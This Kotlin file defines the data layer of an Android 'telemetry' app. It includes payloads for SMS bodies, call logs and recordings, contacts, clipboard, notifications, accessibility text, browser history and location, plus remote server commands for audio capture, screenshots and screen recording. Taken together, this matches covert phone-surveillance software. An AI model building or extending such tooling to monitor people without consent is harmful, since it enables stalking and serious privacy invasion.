package com.pulsedrop.telemetry.data

import com.google.gson.annotations.SerializedName

// --- Outgoing data payloads ---

data class LocationData(
    val lat: Double,
    val lon: Double,
    val accuracy: Float,
    val altitude: Double,
    val speed: Float,
    val timestamp: Long,
    val provider: String
)

data class GeofenceEvent(
    val geofenceId: String,
    val transition: String, // "enter" | "exit"
    val lat: Double,
    val lon: Double,
    val timestamp: Long
)

data class SmsMessage(
    val id: String,
    val address: String,
    val body: String,
    val type: String, // "inbox" | "sent"
    val timestamp: Long,
    val read: Boolean
)

data class CallLogEntry(
    val id: String,
    val number: String,
    val contactName: String?,
    val type: String, // "incoming" | "outgoing" | "missed"
    val durationSeconds: Int,
    val timestamp: Long,
    val recordingFileName: String? = null
)

data class ContactEntry(
    val id: String,
    val name: String,
    val phoneNumbers: List<String>,
    val emails: List<String>
)

data class MediaItem(
    val id: String,
    val type: String, // "image" | "video"
    val fileName: String,
    val filePath: String,
    val sizeBytes: Long,
    val timestamp: Long
)

data class DeviceInfo(
    val batteryLevel: Int,
    val isCharging: Boolean,
    val networkType: String,
    val wifiSsid: String?,
    val ipAddress: String,
    val deviceModel: String,
    val manufacturer: String,
    val osVersion: String,
    val sdkInt: Int,
    val simStatus: String,
    val simOperator: String?,
    val imei: String? = null,
    val timestamp: Long
)

data class SimChangeEvent(
    val previousSimOperator: String?,
    val newSimOperator: String?,
    val timestamp: Long
)

data class BrowserHistoryItem(
    val id: String,
    val title: String,
    val url: String,
    val visits: Int,
    val lastVisited: Long
)

data class BrowserBookmark(
    val id: String,
    val title: String,
    val url: String,
    val created: Long
)

data class InstalledApp(
    val packageName: String,
    val appName: String,
    val versionName: String?,
    val versionCode: Long,
    val installTime: Long,
    val isSystemApp: Boolean
)

data class AppEvent(
    val packageName: String,
    val event: String, // "installed" | "uninstalled"
    val timestamp: Long
)

data class ClipboardEntry(
    val text: String,
    val timestamp: Long
)

data class NotificationEntry(
    val id: String,
    val packageName: String,
    val appName: String,
    val title: String?,
    val text: String?,
    val timestamp: Long
)

data class AccessibilityEvent(
    val packageName: String,
    val text: String,
    val className: String?,
    val timestamp: Long
)

data class CommandResponse(
    val commandId: String,
    val type: String,
    val status: String, // "success" | "error"
    val data: Any? = null,
    val error: String? = null,
    val timestamp: Long
)

// --- Feature toggles ---

data class FeatureToggles(
    val location: Boolean = true,
    val geofence: Boolean = true,
    val sms: Boolean = true,
    val callLog: Boolean = true,
    val callRecording: Boolean = false,
    val contacts: Boolean = true,
    val media: Boolean = false,
    val microphone: Boolean = false,
    val deviceInfo: Boolean = true,
    val browserHistory: Boolean = false,
    val appList: Boolean = true,
    val clipboard: Boolean = false,
    val notifications: Boolean = false,
    val accessibility: Boolean = false,
    val screenRecording: Boolean = false
)

// --- WebSocket command ---

data class ServerCommand(
    @SerializedName("command_id") val commandId: String,
    val type: String, // "pull_location" | "start_audio" | "stop_audio" | "screenshot" | "start_screen_record" | "stop_screen_record" | "fetch_logs" | "update_toggles"
    val payload: Map<String, Any>? = null
)

// --- Upload envelope ---

data class UploadEnvelope(
    val type: String,
    val deviceId: String,
    val timestamp: Long,
    val data: Any
)
